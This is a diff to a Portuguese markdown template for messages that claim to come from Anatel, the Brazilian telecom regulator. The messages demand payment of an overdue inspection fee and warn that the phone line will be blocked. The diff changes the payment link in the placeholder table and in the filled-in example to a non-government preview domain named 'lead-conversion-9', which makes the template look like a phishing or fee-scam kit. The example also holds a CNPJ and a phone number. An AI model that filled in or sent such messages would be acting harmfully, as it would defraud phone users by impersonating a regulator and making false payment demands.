@@ -27,7 +27,7 @@ Regularize pelo link abaixo:
 | `{{cnpj}}` | CNPJ formatado | 47.420.867/0001-60 |
 | `{{numero}}` | Telefone com DDD | (71) 996939035 |
 | `{{data_prazo}}` | Data limite | 20/03/2026 |
-| `{{link}}` | Link de pagamento | https://anatel-fees.preview.emergentagent.com/anatel?cnpj=47420867000160 |
+| `{{link}}` | Link de pagamento | https://lead-conversion-9.preview.emergentagent.com/anatel?cnpj=47420867000160 |
 
 ## Exemplo Preenchido
 
@@ -45,5 +45,5 @@ Consta em nosso sistema pendência da Taxa de Fiscalização de Funcionamento (T
 Caso não seja quitada até a data limite, a linha poderá sofrer bloqueio ou suspensão, conforme regulamentação da Resolução nº 632/2025 da Agência Nacional de Telecomunicações.
 
 Regularize pelo link abaixo:
-🔗 https://anatel-fees.preview.emergentagent.com/anatel?cnpj=47420867000160
+🔗 https://lead-conversion-9.preview.emergentagent.com/anatel?cnpj=47420867000160
 ```
